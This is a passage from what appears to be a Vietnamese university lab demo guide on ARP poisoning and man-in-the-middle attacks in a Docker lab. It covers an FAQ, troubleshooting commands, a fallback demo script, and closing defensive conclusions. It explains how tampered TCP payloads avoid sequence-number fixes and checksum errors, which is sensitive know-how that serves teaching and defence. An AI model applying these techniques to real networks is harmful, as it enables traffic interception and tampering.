| Làm sao phát hiện ARP poisoning? | Hai MAC khác nhau cho cùng IP (Wireshark expert warning), tần suất ARP Reply bất thường, arpwatch/IDS, so khớp bảng ARP. |
| Vì sao Attacker cần `privileged: true`? | Để mở raw socket AF_PACKET và ghi `ip_forward` trong namespace của nó. |
| Có cần tắt firewall không? | Không; môi trường lab không có firewall giữa các container. |
| Tại sao payload phải cùng độ dài? | Để không phải sửa `Seq`/`Ack` và kích thước cửa sổ; nếu khác độ dài phải cập nhật số sequence của các gói sau. |
| Vì sao dùng `nc` chứ không `curl`? | `nc` cho thấy nguyên văn payload, dễ chứng minh nội dung bị sửa. |
| MAC `02:42:...` từ đâu? | Docker gán MAC theo IP trong dải bridge; `02:42` là tiền tố của Docker. |

---

## 4. Sự cố thường gặp và xử lý nhanh

| Hiện tượng | Nguyên nhân | Xử lý |
|---|---|---|
| `nc: Address already in use` | Còn tiến trình `nc -l` cũ giữ cổng 10101 | `docker exec server pkill -x nc`; kiểm tra `ss -ltn \| grep 10101` |
| `arp -n` không đổi sau poison | Poison đã dừng hoặc cache hết hạn | Chạy lại `scenario1/2 --count 0`, kiểm tra log |
| File pcap 0 byte | tcpdump chưa dừng đúng hoặc thiếu `-U` | Luôn `-U`, `pkill -INT tcpdump`, `sleep 2` rồi mới `docker cp` |
| `docker cp` báo không có file | tcpdump chưa tạo file / sai đường dẫn | `ls -l /tmp/*.pcap` trong container trước khi copy |
| Server không nhận được SYN | Thiếu listener hoặc checksum sai | `ss -ltn` trong server; xem log `mitm.py`; đảm bảo bản `mitm.py` có tính lại checksum |
| `docker restart` treo | Docker daemon chậm trên VM 4 GB | Không restart; dùng `docker-compose up -d` / `ip neigh flush all` |
| Container thiếu `tmux`/`tcpdump` | Image cũ trước khi bổ sung package | `docker-compose build && docker-compose up -d` |
| MAC khác báo cáo | Container bị tạo lại với network khác | Giữ nguyên compose, IP cố định -> MAC `02:42:<IP hex>` ổn định |
| `docker exec ... sh -c '... &'` bị treo | Thiếu `-d`, shell chờ tiến trình con | Dùng `docker exec -d ... sh -c "..."` |
| `pkill -f ten-script` tự giết shell | Khi chạy qua plink, cmdline chứa nội dung script | Dùng `pkill -x` hoặc `pkill -f 'ten-script[.]py'` |
| Wireshark báo checksum sai trên veth | Checksum offload của NIC ảo | Bỏ qua cảnh báo, hoặc bắt trong container; kiểm chứng bằng `tshark` |
| Không thấy unicast trên `br-` | Linux bridge không đẩy unicast lên host interface | Bắt trong container hoặc `nsenter -t <pid> -n tcpdump ...` |
| `Permission denied` khi chụp ảnh màn hình | Chạy script bằng `sudo` | Chạy bằng user `bkcs` |
| Ảnh chụp bị cắt chữ | Font/terminal quá lớn | xterm `-fs 11 -geometry 90x46`; Wireshark `gui.zoom_level:1.0` |
| Hết RAM, VM treo | Bật cả 2 nhóm VM hoặc Docker Desktop | Chỉ bật 1 nhóm VM; tắt Docker Desktop |

---

## 5. Phương án dự phòng

Nếu thời gian gấp hoặc máy chậm, chạy một lệnh duy nhất (~90 giây) để sinh lại toàn bộ bằng chứng:

```bash
cd ~/it4263lab/lab02
bash bin/demo-run.sh ~/cap
```

Script lần lượt: B1 -> KB1 -> KB2 -> KB3, in bảng ARP, kết quả ping, nội dung Server nhận, log MITM; lưu `demo_kb1.pcap`, `demo_kb2.pcap`, `demo_kb3*.pcap`. Sau đó chỉ cần mở các pcap này trong Wireshark để chiếu.

Nếu cả script cũng lỗi: chiếu trực tiếp bộ pcap + ảnh đã nộp trong `lab02\evidence\` và `lab02\report\NhomX_Lab02_BaoCao.docx`.

Với Lab01, phương án dự phòng là 4 pcap trong `lab01\` (đã kiểm chứng nội dung), không phụ thuộc mạng.

---

## 6. Câu chốt khi kết thúc demo

- Lab01: chỉ bằng các truy vấn hợp lệ (ARP, SYN, ACK, banner) đã **lập được bản đồ dịch vụ + phiên bản** của Server; bước phòng thủ tối thiểu là tắt telnet, cập nhật OpenSSH/BIND, chặn quét bằng firewall/IDS và không lộ banner phiên bản.
- Lab02: ARP không có xác thực, nên kẻ tấn công **cùng LAN** có thể chuyển hướng lưu lượng, gây DoS (KB1/KB2) và sửa nội dung (KB3) mà không cần exploit. Phòng thủ cần DAI/DHCP Snooping/port security, giám sát ARP và mã hóa đầu cuối; ARP tĩnh chỉ là biện pháp tình thế.
- Điểm nối hai bài: Lab01 cho biết "có gì trên mạng", Lab02 cho thấy "khi đã vào cùng mạng thì có thể làm gì" -> mô hình phòng thủ theo chiều sâu (segmentation + monitoring + encryption).
